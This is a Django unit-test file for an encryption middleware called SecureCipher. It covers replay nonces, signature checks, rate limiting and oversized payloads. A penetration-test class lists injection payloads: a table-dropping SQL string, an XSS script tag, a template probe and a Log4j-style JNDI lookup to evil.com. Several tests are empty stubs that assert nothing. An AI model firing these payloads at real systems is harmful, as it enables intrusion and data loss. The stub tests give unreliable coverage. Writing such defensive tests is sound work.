"""
Security tests for SecureCipher middleware
"""
import unittest
import json
import base64
import time
from unittest.mock import patch, MagicMock
from django.test import TestCase, Client
from django.urls import reverse
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import serialization
from api.models import MiddlewareKey, UsedNonce
from api.views import verify_signature, sign_payload


class SecurityTestCase(TestCase):
    def setUp(self):
        self.client = Client()
        # Create test middleware key
        private_key = ec.generate_private_key(ec.SECP384R1())
        self.private_key_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        ).decode()
        self.public_key_pem = private_key.public_key().public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        ).decode()
        
        MiddlewareKey.objects.create(
            label="active",
            private_key_pem=self.private_key_pem,
            public_key_pem=self.public_key_pem
        )

    def test_replay_attack_prevention(self):
        """Test that nonces prevent replay attacks"""
        nonce = "test_nonce_123"
        
        # First use should succeed
        UsedNonce.objects.create(nonce=nonce)
        
        # Second use should fail
        is_valid, message = UsedNonce.is_nonce_valid(nonce)
        self.assertFalse(is_valid)
        self.assertIn("already used", message)

    def test_signature_verification_valid(self):
        """Test valid signature verification"""
        payload = {"transaction_data": {"amount": 1000}}
        signature = sign_payload(payload, self.private_key_pem)
        
        # Should verify successfully
        result = verify_signature(payload, signature, self.public_key_pem)
        self.assertTrue(result)

    def test_signature_verification_invalid(self):
        """Test invalid signature verification"""
        payload = {"transaction_data": {"amount": 1000}}
        tampered_payload = {"transaction_data": {"amount": 9999}}
        signature = sign_payload(payload, self.private_key_pem)
        
        # Should fail verification with tampered payload
        result = verify_signature(tampered_payload, signature, self.public_key_pem)
        self.assertFalse(result)

    def test_malformed_request_handling(self):
        """Test handling of malformed requests"""
        malformed_requests = [
            {},  # Empty request
            {"ephemeral_pubkey": "invalid_base64"},
            {"ephemeral_pubkey": "dGVzdA==", "ciphertext": "not_valid"},
            {"ephemeral_pubkey": "dGVzdA==", "ciphertext": "dGVzdA=="},  # Missing IV
        ]
        
        for malformed_data in malformed_requests:
            response = self.client.post('/api/secure/gateway/', 
                                      data=json.dumps(malformed_data),
                                      content_type='application/json')
            self.assertIn(response.status_code, [400, 500])

    def test_timestamp_validation(self):
        """Test timestamp validation for requests"""
        # Test old timestamp (should fail)
        old_timestamp = int(time.time()) - 600  # 10 minutes old
        
        # Test future timestamp (should fail)
        future_timestamp = int(time.time()) + 600  # 10 minutes in future
        
        # Test valid timestamp (should pass)
        valid_timestamp = int(time.time())
        
        # Implementation depends on your actual timestamp validation logic
        # This is a framework for the test

    @patch('api.downstream_handler.send_downstream_request')
    def test_downstream_communication_failure(self, mock_send):
        """Test handling of downstream service failures"""
        mock_send.return_value = ({'error': 'Service unavailable'}, 503)
        
        # Test that middleware handles downstream failures gracefully
        # Implementation depends on your actual error handling

    def test_nonce_cleanup(self):
        """Test nonce cleanup functionality"""
        # Create old nonces
        old_nonce = UsedNonce.objects.create(nonce="old_nonce")
        # Manually set old timestamp
        old_nonce.timestamp = old_nonce.timestamp.replace(hour=0)
        old_nonce.save()
        
        # Run cleanup
        deleted_count = UsedNonce.cleanup_expired_nonces(hours=12)
        self.assertGreater(deleted_count, 0)

    def test_crypto_parameter_validation(self):
        """Test validation of cryptographic parameters"""
        # Test invalid curve
        # Test invalid key sizes
        # Test invalid algorithms
        pass  # Implement based on your crypto validation logic


class PenetrationTestCase(TestCase):
    """Simulated penetration testing"""
    
    def setUp(self):
        self.client = Client()

    def test_injection_attacks(self):
        """Test various injection attack vectors"""
        injection_payloads = [
            "'; DROP TABLE api_usednonce; --",
            "<script>alert('xss')</script>",
            "{{7*7}}",  # Template injection
            "${jndi:ldap://evil.com/a}",  # Log4j style
        ]
        
        for payload in injection_payloads:
            malicious_data = {
                "ephemeral_pubkey": payload,
                "ciphertext": payload,
                "iv": payload
            }
            response = self.client.post('/api/secure/gateway/',
                                      data=json.dumps(malicious_data),
                                      content_type='application/json')
            # Should handle gracefully without execution
            self.assertIn(response.status_code, [400, 500])

    def test_rate_limiting(self):
        """Test rate limiting functionality"""
        # Send multiple rapid requests
        responses = []
        for _ in range(15):  # Exceed typical rate limit
            response = self.client.post('/api/secure/gateway/',
                                      data=json.dumps({}),
                                      content_type='application/json')
            responses.append(response.status_code)
        
        # Should eventually return 429 (Too Many Requests)
        self.assertIn(429, responses)

    def test_dos_protection(self):
        """Test protection against DoS attacks"""
        # Test large payload handling
        large_payload = "A" * (10 * 1024 * 1024)  # 10MB payload
        response = self.client.post('/api/secure/gateway/',
                                  data=large_payload,
                                  content_type='application/json')
        # Should reject large payloads
        self.assertEqual(response.status_code, 413)  # Payload Too Large


if __name__ == '__main__':
    unittest.main()
